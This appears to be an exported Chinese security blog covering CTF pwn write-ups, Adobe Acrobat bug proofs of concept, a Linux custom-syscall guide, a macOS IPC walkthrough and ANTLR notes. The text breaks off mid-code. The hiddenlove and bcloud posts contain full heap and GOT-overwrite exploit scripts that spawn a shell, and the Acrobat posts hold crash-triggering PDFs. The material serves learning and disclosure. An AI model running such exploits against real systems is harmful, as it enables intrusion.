{"pages":[{"title":"Pwnable Log","text":"下面这些是一份关于CTF中PWN类型题目的一点总结，个人精力有限，只做了这么一点。从接触这些来，两年了吧，所学到的东西都来自互联网、一些前辈的指点，所以想着把自己了解的做成一个list，简单的整合，方便其他人学习。不足之处还请见谅，欢迎补充。 Pwnable log by muhe@Syclover如果这个list有问题，请与我邮件联系o0xmuhe#gmail.com Pwnable log1. Stack Vuln1.1 Vuln1.1.1 Stack overflow1.1.2 Stack Variables uninitialized1.1.3 off by one1.2 Tech1.2.1 ROP[1] Dynamic Linking[2] Static Linking[3] x86 &amp;&amp; x641.2.2 Frame Fake2. Heap Vuln2.1 Vuln2.1.1 unsafe unlink (old libc)2.1.2 off by one2.1.3 double free2.1.4 use after free2.2 Tech2.2.1 Malloc Maleficarum[1] The House of Prime[2] The House of Mind[3] The House of Force[4] The House of Lore[5] The House of Spirit2.2.2 unsorted bin unlink(free ‘d’)2.2.3 small/large bin unlink(malloc’d)2.2.4 fastbin dumlicate2.2.5 hijack function pointer2.2.6 craft overlapping chunks2.2.7 heap spray3. Format String Vuln3.1 Vuln3.1.1 x863.1.2 x643.2 Tech3.2.1 leak func addr3.2.2 dump bin file with fmt4. Other Vuln4.1 Vuln4.1.1 Integer overflow4.1.2 fsp overflow4.2 Tech4.2.1 ssp leak5. Some Tricks5.1 one gadget rce5.2 canary crack5.3 canary leak5.4 bin file dump5.5 fast confirm libc’s version6. Pwn in AD mode","link":"/Pwnable-Log/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"About Me","text":"关注二进制安全- RE - PWN Member of Syclover&nbsp;&nbsp;&nbsp;&nbsp;酷炫的主页 前CTFerre &amp;&amp; pwn 弱鸡 :) Work Qihoo360 (2017.7–2020.1) Andsecurity (2020.1–2020.11) 某甲方(2020.11–) bug hunting &amp;&amp; exploit BugsCVE-2018-12757,CVE-2018-12831,CVE-2018-16041,CVE-2019-7062, CVE-2019-7063,CVE-2019-7064, CVE-2019-7067,CVE-2019-7018, CVE-2019-7019, CVE-2019-7020,CVE-2019-7021, CVE-2019-7022, CVE-2019-7023, CVE-2019-7024, CVE-2019-7029,CVE-2019-7813, AdobeDCPro_Touch_UaF, Foxit Reader OOBR, AFDKO bugs, macOS atsd oobr, Skype msg spoof GPG12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-----BEGIN PGP PUBLIC KEY BLOCK-----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Z7tt-----END PGP PUBLIC KEY BLOCK-----","link":"/about/index.html"},{"title":"frinds","text":"Syclover Team最爱的高老师0x9A82学弟K1n9师傅L3mon咸鱼rootclayV1ct0rGodot学弟Homaebic学弟两米的sco4x0JimmyZhou灭亡叔叔JasonMosuank0sh1WinterSunVenenofIcemakrSwing4ido10n王松_Striker7topbendawang前端joker大佬lc4tSzrzvdnysixwhale小姐姐CTF Rank重庆五套房的小葱石头邢老师最优秀m3lon","link":"/frinds/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"360春秋CTF--pwn","text":"0x00 : pwn300 smallest1.vuln直接栈溢出，但是利用SYSCALL读取的。 2. think考察SROP 3. exploit1:( undone. 0x01 : pwn350 hiddenlove1.vuln说句题外话…几乎原封不动抄hitcon2016–babyheap的，就改了改字符串… 输入函数的off-by-one。 2. think程序限制了只能一次edit一次free，但是提示ubuntu16.04版本，这个版本scanf函数读取大量数据会有heap的分配。 通过堆布局来伪造堆头结构，然后再结合off by one伪造指针，得到任意地址读写，然后劫持got去get shell。 3. exploit其实直接拿babyheap的exp改就行了… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#!/usr/bin/env pythonfrom sc_pwn import *env = Environment('local', 'remote')env.set_item('target', local = {'host':'localhost','port':10001}, \\ remote = {'host':'106.75.84.68','port':20000})env.select()binf = ELF('./hiddenlove', rop=True)libc = ELF('./libc.so.6')'''addr_got_free = binf.got('free')addr_got_exit = binf.got('exit')addr_got_puts = binf.got('puts')addr_plt_puts = binf.plt('puts')addr_plt_printf = binf.plt('printf')addr_plt_alarm = binf.plt('alarm')addr_plt_read = binf.plt('read')addr_plt_stack_cf = binf.plt('__stack_chk_fail')addr_plt_libc_stm = binf.plt('__libc_start_main')addr_plt_malloc = binf.plt('malloc')addr_plt_atoi = binf.plt('atoi')addr_plt_scanf = binf.plt('__isoc99_scanf')addr_plt_setbuf = binf.plt('setbuf')addr_plt_exit = binf.plt('exit')'''#==========def attack(cmn): bh = BabyHeap(cmn) chunk_1 = 'nn' chunk_1 += '\\x00'*(0x1000-0x18-len(chunk_1)) chunk_1 += pack_64(0x50) bh.Exit(chunk_1) print 'part 1 done' chunk_3 = pack_64(0) chunk_3 += pack_64(0x21) bh.New(0x80, chunk_3, 'A'*8) print 'part 2 done' bh.Delete() print 'part 3 done' rewrite_got = pack_64(0x4006C0+6) # puts rewrite_got += pack_64(0x4006D0+6) #stack_check rewrite_got += pack_64(0x4006E0+6) #setbuf rewrite_got += pack_64(0x4006F0+6) #printf rewrite_got += pack_64(0x400700+6) # alarm rewrite_got += pack_64(0x400710+6) # read rewrite_got += pack_64(0x400720+6) # start main rewrite_got += pack_64(0x400730+6) #malloc rewrite_got += pack_64(0x4006F0) # atoi --changed rewrite_got += pack_64(0x400750+6) rewrite_got += pack_64(0x400700) #exit chunk_2 = '\\x00'*0x20 chunk_2 += pack_64(len(rewrite_got)) # size chunk_2 += pack_64(0) # name (over written) chunk_2 += pack_64(addr_got_puts) # &amp;content bh.New(0x48, chunk_2, 'name') bh.Edit(rewrite_got) # got_exit &lt;- alarm, got_atoi &lt;- printf print 'part 4 done' #cmn.read_until('feet') sleep(0.5) cmn.send('%7$saaaa'+pack_64(addr_got_free)) # FSB junk = cmn.read_until('4.Just throw yourself at her feet\\n') addr_libc_free = cmn.read(6).ljust(8, &quot;\\x00&quot;) addr_libc_free = unpack_64(addr_libc_free+'\\x00'*(8-len(addr_libc_free))) info('addr_libc_free = 0x%08x' % addr_libc_free) print 'part 5 done' libc.set_location('free', addr_libc_free) addr_libc_system = libc.function('system') info('addr_libc_system = 0x%08x' % addr_libc_system) print 'part 6 done' rewrite_got = pack_64(0x0000000004006C0+6) #puts rewrite_got += pack_64(0x0000000004006D0+6) #fail rewrite_got += pack_64(0x00000000004006E0+6) #setbuf rewrite_got += pack_64(0x00000000004006F0+6) #printf rewrite_got += pack_64(0x0000000000400700+6)#alarm rewrite_got += pack_64(0x400716) #read rewrite_got += pack_64(0x000000000400720+6) #start rewrite_got += pack_64(0x000000000400730+6) #malloc rewrite_got += pack_64(addr_libc_system) #atoi rewrite_got += pack_64(0x000000000400750+6) #scanf rewrite_got += pack_64(0x400B0B) #exit cmn.read_until('feet') cmn.sendln('2') cmn.read_until('feelings') cmn.send(rewrite_got) sleep(0.5) cmn.send('/bin/sh\\0') #==========class BabyHeap: def __init__(self, cmn): self._read = cmn.read self._read_until = cmn.read_until self._send = cmn.send self._sendln = cmn.sendln def New(self, size, content, name): self._read_until('feet') self._sendln('1') prompt = self._read(12) if 'how many' in prompt: self._sendln(str(size)) self._read_until('her(0~1000)') self._send(content) self._read_until('name') self._send(name) else: fail('Remote program is exited') def Delete(self): self._read_until('feet') self._sendln('3') def Edit(self, content): self._read_until('feet') self._sendln('2') self._read_until('feelings') self._send(content) def Edit1(self, content): self._sendln('2') sleep(0.5) self._send(content) def Exit(self, ans): self._read_until('feet') self._sendln('4') self._read_until('(Y/N)') self._sendln(ans) #==========if __name__=='__main__': cmn = Communicate(env.target,mode='SOCKET') attack(cmn) sh = Shell(cmn) sh.select() del(sh) del(cmn)#========== 0x03 :吐槽这个比赛运维水平真的有问题… 题目重复这个也不说了，反正某春秋之前的比赛也是这样。","link":"/2017/04/22/360%E6%98%A5%E7%A7%8BCTF-pwn/"},{"title":"Adobe Acrobat DC Pro OOB(CVE-2019-7813)","text":"InfoOut-of-Bounds Read PoC12345678910%PDF-1.71 0 obj&lt;&lt;&gt;&gt;%endobjtrailer&lt;&lt;/Root&lt;&lt;/Pages 1 0 R&gt;&gt;&gt;&gt; click File–&gt;Properties boring bug :( Patch &amp;&amp; Bulletinadobe psirt","link":"/2019/05/15/Adobe-Acrobat-DC-Pro-OOB-CVE-2019-7813/"},{"title":"Adding your own syscall in linux kernel","text":"0x00:主要是一个记录，搞kernel exploit可能会需要。给自己的linux增加一个自定义的系统调用，开始找的资料比较老3.x的内核，然而4.x的源码和3.x源码结构不太一样，所以过程也不太一样，多多参考一些比较官方的文档 环境准备 ubuntu 14.04 LTS x86 (4.2.0-42-generic) 0x01:过程1.获取源码apt-get source linux-image-$(uname -r) 2.编辑源码首先创建一个目录放新增系统调用的定义mkdir helloworld &amp;&amp; cd helloworld然后进去 123# muhe @ ubuntu in ~/linux_kernel_study/linux-lts-wily-4.2.0/helloworld [6:48:05] $ lshelloworld.c Makefile 123456#include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void){ printk(\"Hello world\\n\"); return 0;} 12Makefileobj-y=helloworld.o 然后修改源码目录下的Makefile，把刚才新建的helloworld目录加进去如图所示 修改include/linux/syscalls.h文件，把helloworld原型加进去 12345678...asmlinkage long sys_bpf(int cmd, union bpf_attr *attr, unsigned int size);asmlinkage long sys_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags);asmlinkage long sys_helloworld(void);#endif 然后修改arch/x86/entry/syscalls下的syscall_32.tbl文件 添加这个调用的信息 123456...355 i386 getrandom sys_getrandom356 i386 memfd_create sys_memfd_create357 i386 bpf sys_bpf358 i386 execveat sys_execveat stub32_execveat359 i386 helloworld sys_helloworld 3.编译新内核先安装一些需要的工具 123sudo apt-get build-dep linux-image-$(uname -r)sudo apt-get updatesudo apt-get install curses-dev 然后是配置 1234chmod a+x debian/scripts/*chmod a+x debian/scripts/misc/*fakeroot debian/rules cleanfakeroot debian/rules editconfigs 编译 12fakeroot debian/rules cleanfakeroot debian/rules binary-headers binary-generic -j 2 4.安装因为这样编译出来的是deb，所以直接dpkg安装就行了。安装结束后直接重启就好了。 0x02：测试编写测试程序 123456789101112#include &lt;stdio.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;int main(){ printf(\"Invoking 'helloworld' system call\"); long int ret = syscall(359); // 359 is the syscall number return 0;} 编译后运行，然后使用dmesg查看打印的消息。可以看到打印了helloworld的信息，即这个syscall添加成功。 0x03：参考与引用Implementing a system call in Linux Kernel 4.7.1[UBUNTU 14.04] BUILDING LINUX KERNELLinux/Documentation/adding-syscalls.txtAdding hello world system call to Linux","link":"/2017/02/08/Adding-your-own-syscall-in-linux-kernel/"},{"title":"Adobe Acrobat DC Pro touchup UaF","text":"Info应该是18年下半年fuzz到的，不记得哪个版本的Adobe Acrobat DC Pro的UaF了，当时测试的是只能在32位机器上触发，留这个洞留了一个月没管，在19年年初修了。 藏洞藏到最后一无所有。 PoC12345678910111213141516171819var ooo = new Object();app.trigger = function() { app.doc.embedDocAsDataObject({cName:&quot;http://www.B.com&quot;, oDoc:app.trigger});}//must keep this linetry{app.doc.newPage({nWidth:200, nHeight:72, nPage:2});}catch(e){}//triggertry{ooo.valueOf = app.trigger;}catch(e){}//must keep this line try{ooo.valueOf();}catch(e){} poc.pdf","link":"/2019/07/16/Adobe-Acrobat-DC-Pro-touchup-UaF/"},{"title":"Apple IPC : DO Basic","text":"MacOS IPC 之 DO 简介DO全称是Distributed Objects，从字面上来看意思很好理解，分布式对象。这是一种IPC方式，简单易用，实现的效果就是：通过launchd和一个proxy object，任何的进程都可以访问到server中的DO对象，也可以调用这个对象的方法，从而实现IPC。下面是一个流程图： (图来自pj0的博客，ianbeer的文章) 示例代码server.m 12345678910111213141516171819202122#import &lt;objc/Object.h&gt;#import &lt;Foundation/Foundation.h&gt;@interface VendMe : NSObject- (oneway void) foo: (int) value;@end@implementation VendMe- (oneway void) foo: (int) value;{NSLog(@&quot;%d&quot;, value);}@endint main (int argc, const char * argv[]) { VendMe* toVend = [[VendMe alloc] init]; NSConnection *conn = [NSConnection defaultConnection]; [conn setRootObject:toVend]; [conn registerName:@&quot;com.foo.my_test_service&quot;]; [[NSRunLoop currentRunLoop] run]; return 0;} client.m 123456789#import &lt;Cocoa/Cocoa.h&gt;int main(int argc, char** argv){ id theProxy = [[NSConnection rootProxyForConnectionWithRegisteredName:@&quot;com.foo.my_test_service&quot; host:nil] retain]; [theProxy foo:123]; return 0;} Makefile 12345all: clang client.m -o client -framework Foundation clang server.m -o server -framework Foundationclean: rm server client 运行效果： 123456789101112131415161718# run server╰─$ ./server2019-08-10 22:27:07.545 server[28274:2677291] 1232019-08-10 22:27:08.897 server[28274:2677291] 1232019-08-10 22:27:09.662 server[28274:2677291] 1232019-08-10 22:27:10.172 server[28274:2677291] 123# run client times...╭─muhe@muheMacBookPro ~/Downloads/DO_Study╰─$ ./client╭─muhe@muheMacBookPro ~/Downloads/DO_Study╰─$ ./client╭─muhe@muheMacBookPro ~/Downloads/DO_Study╰─$ ./client╭─muhe@muheMacBookPro ~/Downloads/DO_Study╰─$ ./client╭─muhe@muheMacBookPro ~/Downloads/DO_Study╰─$ 效果看起来很简单，类似socket通信那种效果，server跑起来等待连接，client连上去，然后通过launchd和proxy obj调用了server里的方法，参数是client传递的，看起来像是client执行了一个函数，其实真正代码执行的是server。 OC的语法虽然很奇怪，但是问题不大，还是能看懂： server: 通过NSConnection注册了一个用于DO的对象，设置的对象是VendMe，注册名是com.foo.my_test_service，用来标示这个服务。随后使用Runloop使得server能随时处理事件但并不退出,关于Runloop的分析本文不会涉及。 client client的逻辑很简单，通过NSConnection连接目标服务，然后通过proxy obj调用他的foo方法，并传递一个123的参数给他。 大概逻辑就这个样子。 逆向分析为什么要提及这部分，apple大部分服务都不开源，而且用的IPC方式都不确定，逆向的时候需要想办法确定，并且找到关键函数，比如上例中的foo函数，找到处理函数，方便代码审计。 这里只需要关注服务端（废话），所以直接贴F5后的代码： 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp){ VendMe *v3; // rax VendMe *v4; // ST28_8 void *v5; // ST20_8 void *v6; // rax v3 = objc_msgSend(&amp;OBJC_CLASS___VendMe, &quot;alloc&quot;, envp); v4 = objc_msgSend(v3, &quot;init&quot;); v5 = objc_msgSend(&amp;OBJC_CLASS___NSConnection, &quot;defaultConnection&quot;); objc_msgSend(v5, &quot;setRootObject:&quot;, v4); objc_msgSend(v5, &quot;registerName:&quot;, CFSTR(&quot;com.foo.my_test_service&quot;)); v6 = objc_msgSend(&amp;OBJC_CLASS___NSRunLoop, &quot;currentRunLoop&quot;); objc_msgSend(v6, &quot;run&quot;); return 0;} oc这些函数调用基本都变成objec_msgSend(a,b,xxx)了，不过不太影响看，我的理解就是a.b(xxx)，大概这个样子，知道这行代码在做什么，对于逆向已经够了。 关键点在于找DO的对象以及和他绑定的方法。通过上面的方法，能找到:v4--&gt;v3--&gt;OBJC_CLASS___VendMe,那么就是OBJC_CLASS___VendMe这个对象了，下面是找和他绑定的方法。 直接找到的是: 12345__objc_data:0000000100001198 _OBJC_CLASS_$_VendMe __objc2_class &lt;offset _OBJC_METACLASS_$_VendMe, \\__objc_data:0000000100001198 ; DATA XREF: __objc_classlist:0000000100001060↑o__objc_data:0000000100001198 ; __objc_classrefs:classRef_VendMe↑o__objc_data:0000000100001198 offset _OBJC_CLASS_$_NSObject, \\__objc_data:0000000100001198 offset __objc_empty_cache, 0, offset VendMe_$classData&gt; 然后根据classData找到 ： 12345__objc_const:00000001000010D8 VendMe_$classData __objc2_class_ro &lt;0, 8, 8, 0, 0, offset aVendme, \\__objc_const:00000001000010D8 ; DATA XREF: __objc_data:_OBJC_CLASS_$_VendMe↓o__objc_const:00000001000010D8 offset _OBJC_INSTANCE_METHODS_VendMe, 0, 0, 0, 0&gt; ; &quot;VendMe&quot;__objc_const:00000001000010D8 __objc_const ends__objc_const:00000001000010D8 最后 1234__objc_const:00000001000010B8 _OBJC_INSTANCE_METHODS_VendMe __objc2_meth_list &lt;18h, 1&gt;__objc_const:00000001000010B8 ; DATA XREF: __objc_const:VendMe_$classData↓o__objc_const:00000001000010C0 __objc2_meth &lt;offset sel_foo_, offset aVv2008i16, \\ ; -[VendMe foo:] ...__objc_const:00000001000010C0 offset __VendMe_foo__&gt; 依靠对classData的引用看。 其实也可以的知道了DO对象的对象名之后直接搜函数列表，比如:VendeMe:。 这个是在有符号的情况下，不过符号这个看运气了，不一定有 符号。 VendeMe:foo 1234void __cdecl -[VendMe foo:](VendMe *self, SEL a2, int a3){ NSLog(CFSTR(&quot;%d&quot;), (unsigned int)a3);} 用户的参数从a3开始算。 这类服务漏洞挖掘主动fuzz：找到处理函数，确定类型，然后主动写客户端fuzz。 被动fuzz：hook处理点，但是要一个一个hook，然后修改数据。 代码审计：找处理函数，人肉看逻辑。 引用revisiting-apple-ipc","link":"/2019/08/10/Apple-IPC-DO-Basic/"},{"title":"BCTF--cloud","text":"0x00: 简介最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。 测试环境:ubuntu 16.04 x64 0x01:程序分析程序是个菜单式的程序，看了下功能，应该就是堆上的一些利用了。看下开启了什么保护。 基本信息就是上面说的那样，下面是具体的分析： 功能：每个笔记(chunk)的大小、内容、状态以数组形式存储在.bss段 问题：ban掉了show的操作，需要自己去构造下泄露了。 先开始看在进入菜单之前的函数:这个函数读入用户名，没看到明显的溢出点，但是问题在于 unsafe_read() 函数，如果输入长度为0x40，那么就可以引发一个堆地址泄露，即在输出用户名的时候，输出一个堆地址。 地址泄露 get!下面是这个函数，读取host 和 org然后malloc分配空间，之后拷贝过去，由于使用的还是unsafe_read(),所以可以构造一个hof，这种利用需要堆地址，正好，之前有个泄露，这下就满足条件了。 0x02:利用思路那么既然确定了是hof利用，利用的思路就出来了： 利用hof的思路，去分配到.bss上的 0x0804b0a0 地址 12345chunk_length[] ----&gt; 0x0804b0a0...chunk_status[]...chunk_list[] ----&gt; 0x0804B120 分配到之后，利用edit功能去填入要改写的函数got，先构造一次泄露： 1chunk_list[]中放：atoi@got,free@got,atoi@got 然后修改free@got为printf函数地址，利用delete功能去泄露atoi地址。 得到atoi()地址之后，利用libc.so确定system()和atoi()的偏移。 修改atoi()地址为system()，之后随便用下菜单的功能，发送一个/bin/sh\\0过去就getshell了。 0x03:exploit12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#!/usr/bin/env python# coding=utf-8# by muhefrom pwn import *context.log_level = 'debug'name_addr = 0x0804B0CCbss_addr = 0x0804b0a0atoi = 0x0804b03cfree = 0x0804b014printf_plt = 0x080484D0'''chunk_length[] ----&gt; 0x0804b0a0chunk_status[]chunk_list[] ----&gt; 0x0804B120'''target = \"./bcloud\"#target = ('127.0.0.1',10001)p = process(target)#p = context(target)def new_note(p,length,content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('content:') p.sendline(str(length)) p.recvuntil('content:') p.sendline(str(content))def edit_note(p,index,new_content): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil('id:') p.sendline(str(index)) p.recvuntil('content:') p.sendline(str(new_content))def delete_note(p,index): p.recvuntil('option---&gt;&gt;') p.sendline('4') p.recvuntil('id:') p.sendline(str(index))def main(): # leak heap address name = \"A\"*60+\"BBBB\" p.send(name) p.recvuntil('BBBB') leak = u32(p.recv(4)) print hex(leak) # hof here usr_host = \"B\"*0x40 fuck_top_chunk = \"\\xff\\xff\\xff\\xff\" p.send(usr_host) p.sendline(fuck_top_chunk) # get list_length chunk.. size = (bss_addr-0x8)-leak-0x8 - 208 new_note(p,size,'AAAA') p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('content:') p.sendline('172') #fill the list_length[] &amp;&amp; list_content[] payload = p32(4) payload += p32(4) payload += p32(4) payload += p32(0) * 29 payload += p32(atoi) payload += p32(free) payload += p32(atoi) payload += p32(0) * 8 p.send(payload) # change free() to printf() raw_input('$debug...') p.sendline('3') p.sendline('1') p.send(p32(printf_plt)) # leak addr of atoi() delete_note(p,0) garbage = p.recvuntil(\"Input the id:\\n\") leak_atoi = u32(p.recv(4)) print \"got atoi() ----&gt;\"+hex(leak_atoi) # get system() addr system_addr = leak_atoi + 0xd8f0 # overwrite atoi() to system() &amp;&amp; getshell p.sendline('3') p.sendline('2') p.send(p32(system_addr)) garbage = p.recv() p.sendline(\"/bin/sh\\x00\") p.interactive()if __name__ == '__main__': main() getshell~~ 0x04:参考uaf.io","link":"/2016/09/27/BCTF-cloud/"},{"title":"Antlr4初体验","text":"0x00：介绍Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。 0x01: why this？我一直觉得编译原理相关的东西（理论也好，工具也好）可以和漏洞挖掘发生奇妙的化学反应。和9k师傅聊过相关的东西，有类似想法的人很多。甚至github上六年前的一个项目，使用flex+bison去生成文件来做fuzz。 和flex+bison比较，antlr4无疑是更容易上手，也更加强大的，当然用哪个就是仁者见仁智者见智了。 在深入学习这些东西之后，对domato的思想有了更深刻的理解。其实就是词法分析那套，自顶向下的。不得不说，真的很棒，而且应用范围很广泛，但是效果怎么样我就不知道了，还在摸索。 0x02： 关于本文《Antlr4权威指南》中8.4章节练习的学习记录。这部分的例子是一个语法检查器，针对Cymbol语言的。 比如下面的代码： 1234567891011121314151617int f(int x, float y) { g(); // forward reference is ok i = 3; // no declaration for i (error) g = 4; // g is not variable (error) return x + y; // x, y are defined, so no problem}void g() { int x = 0; float y; y = 9; // y is defined f(); // backward reference is ok z(); // no such function (error) y(); // y is not function (error) x = f; // f is not a variable (error)} 经过该语法检查器，可以将一些语法错误找出来，比如未定义的符号、类型引用错误(函数当变量，变量当函数)。 0x03: 例子1. 语法分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/** Simple statically-typed programming language with functions and variables * taken from &quot;Language Implementation Patterns&quot; book. */grammar Cymbol;file: (functionDecl | varDecl)+ ;varDecl : type ID ('=' expr)? ';' ;type: 'float' | 'int' | 'void' ; // user-defined typesfunctionDecl : type ID '(' formalParameters? ')' block // &quot;void f(int x) {...}&quot; ;formalParameters : formalParameter (',' formalParameter)* ;formalParameter : type ID ;block: '{' stat* '}' ; // possibly empty statement blockstat: block | varDecl | 'if' expr 'then' stat ('else' stat)? | 'return' expr? ';' | expr '=' expr ';' // assignment | expr ';' // func call ;/* expr below becomes the following non-left recursive rule:expr[int _p] : ( '-' expr[6] | '!' expr[5] | ID | INT | '(' expr ')' ) ( {8 &gt;= $_p}? '*' expr[9] | {7 &gt;= $_p}? ('+'|'-') expr[8] | {4 &gt;= $_p}? '==' expr[5] | {10 &gt;= $_p}? '[' expr ']' | {9 &gt;= $_p}? '(' exprList? ')' )* ;*/expr: ID '(' exprList? ')' # Call | expr '[' expr ']' # Index | '-' expr # Negate | '!' expr # Not | expr '*' expr # Mult | expr ('+'|'-') expr # AddSub | expr '==' expr # Equal | ID # Var | INT # Int | '(' expr ')' # Parens ;exprList : expr (',' expr)* ; // arg listK_FLOAT : 'float';K_INT : 'int';K_VOID : 'void';ID : LETTER (LETTER | [0-9])* ;fragmentLETTER : [a-zA-Z] ;INT : [0-9]+ ;WS : [ \\t\\n\\r]+ -&gt; skip ;SL_COMMENT : '//' .*? '\\n' -&gt; skip ; 2. 符号表这部分是精髓，作者直接拿了自己另一本书里的代码来用，代码不长也好懂。这里我只列一部分比较重要的： 1234567891011121314151617181920212223242526public abstract class BaseScope implements Scope { Scope enclosingScope; // 临近的作用区，如果当前是全局作用域，应该置null // 